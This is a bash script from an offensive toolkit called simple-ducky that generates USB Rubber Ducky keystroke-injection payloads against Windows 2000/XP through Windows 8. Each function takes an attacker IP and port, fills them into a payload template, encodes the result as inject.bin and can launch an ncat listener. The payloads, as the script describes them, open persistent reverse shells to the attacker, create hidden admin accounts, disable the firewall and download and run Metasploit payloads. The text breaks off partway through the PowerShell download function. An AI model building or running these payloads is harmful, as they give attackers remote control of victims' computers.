#!/bin/bash
#################################################################################
#################################################################################
#
# Windows Reverse Shell Payloads
#
#################################################################################
#################################################################################

#################################################################################
# Persistence Reverse Shell w/UAC (Win Vista/7)
#################################################################################
f_persistenceVIS7uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell everytime a victim logs into his/her computer. It also creates and hides an admin account, drops the firewall, and enables Remote Deskop/Remote Assistance."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "Where shall I send your persistent shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	read -p "If you are using Kali, would you like me to move ncat.exe to your web directory and start your webserver [y/n]? " Ncat
	if [ "$Ncat" == "y" ]; then
		clear
		cp /usr/share/simple-ducky/misc/ncat.exe /var/www/
		service apache2 stop
		service apache2 start
		clear
	else
	clear
	fi
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/persistenceVIS7uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerip-attackerport/$attackerip $attackerport/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Persistence Reverse Shell w/o UAC (Win Vista/7)
#################################################################################
f_persistenceVIS7nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell everytime a victim logs into his/her computer. It also creates and hides an admin account, drops the firewall, and enables Remote Deskop/Remote Assistance."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC disabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "Where shall I send your persistent shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	read -p "If you are using Kali, would you like me to move ncat.exe to your web directory and start your webserver [y/n]? " Ncat
	if [ "$Ncat" == "y" ]; then
		clear
		cp /usr/share/simple-ducky/misc/ncat.exe /var/www/
		service apache2 stop
		service apache2 start
		clear
	else
	clear
	fi
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/persistenceVIS7nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerip-attackerport/$attackerip $attackerport/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear	
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Persistence Reverse Shell w/UAC (Win 8)
#################################################################################
f_persistenceWIN8uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell everytime a victim logs into his/her computer. It also creates and hides an admin account, drops the firewall, and enables Remote Deskop/Remote Assistance."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "Where shall I send your persistent shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	read -p "If you are using Kali, would you like me to move ncat.exe to your web directory and start your webserver [y/n]? " Ncat
	if [ "$Ncat" == "y" ]; then
		clear
		cp /usr/share/simple-ducky/misc/ncat.exe /var/www/
		service apache2 stop
		service apache2 start
		clear
	else
	clear
	fi
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/persistenceWIN8uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerip-attackerport/$attackerip $attackerport/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Persistence Reverse Shell w/o UAC (Win 8)
#################################################################################
f_persistenceWIN8nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell everytime a victim logs into his/her computer. It also creates and hides an admin account, drops the firewall, and enables Remote Deskop/Remote Assistance."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 with UAC disabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "Where shall I send your persistent shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	read -p "If you are using Kali, would you like me to move ncat.exe to your web directory and start your webserver [y/n]? " Ncat
	if [ "$Ncat" == "y" ]; then
		clear
		cp /usr/share/simple-ducky/misc/ncat.exe /var/www/
		service apache2 stop
		service apache2 start
		clear
	else
	clear
	fi
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payloads/persistenceWIN8nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/simple-ducky/payload_del2.txt > /usr/share/simple-ducky/payload_del3.txt
	sed "/STRING/s/attackerip-attackerport/$attackerip $attackerport/g" /usr/share/simple-ducky/payload_del3.txt > /usr/share/simple-ducky/payload_del4.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/simple-ducky/payload_del4.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	rm /usr/share/simple-ducky/payload_del2.txt
	rm /usr/share/simple-ducky/payload_del3.txt
	rm /usr/share/simple-ducky/payload_del4.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Windows Reverse Shell (No Download|W2K/XP)
#################################################################################
f_windowsrevW2KXP(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide an adminstrative reverse shell when the Powershell, Download, and Execute is not feesable."
	echo -e "\e[1;31mTarget:\e[0m WIN2K/XP"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen (Props to IllWill)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/windowsrevW2KXP.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Windows Reverse Shell w/UAC (No Download|Win Vista/7)
#################################################################################
f_windowsrevVIS7uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide an adminstrative reverse shell when Powershell, Download, and Execute is not feesable."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC enabled\e[0m"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen (Props to IllWill)(slight modifications by skysploit)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use milliseconds (15000 ms = 15 sec)" pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/windowsrevVIS7uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Windows Reverse Shell w/o UAC (No Download|Win Vista/7)
#################################################################################
f_windowsrevVIS7nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide an adminstrative reverse shell when Powershell, Download, and Execute is not feesable."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC enabled\e[0m"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen (Props to IllWill)(slight modifications by skysploit)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/windowsrevVIS7nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
	xdg-open /usr/share/simple-ducky/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear	
	fi

	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Windows Reverse Shell w/UAC (No Download|Win 8)
#################################################################################
f_windowsrevWIN8uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide an adminstrative reverse shell when Powershell, Download, and Execute is not feesable."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC enabled\e[0m"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen (Props to IllWill)(slight modifications by skysploit)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec	
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/windowsrevWIN8uac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
		xdg-open /usr/share/simple-ducky/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Windows Reverse Shell w/o UAC (No Download|Win 8)
#################################################################################
f_windowsrevWIN8nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide an adminstrative reverse shell when Powershell, Download, and Execute is not feesable."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC enabled\e[0m"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen (Props to IllWill)(slight modifications by skysploit)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec	
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/windowsrevWIN8nouac.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		x-terminal-emulator -e ncat -lvp $attackerport &
	xdg-open /usr/share/simple-ducky/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear	
	fi

	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Powershell Download & Execute (User Priv Shell|Win Vista/7)
#################################################################################
f_powershellVIS7(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide either a Meterpreter or Standard shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with user privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7"
	echo -e "\e[1;31mAuthor:\e[0m mubix"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo -e ""
	read -p "Would you like a meterpreter or Ncat shell[met/nc]? " payloadtype
	clear
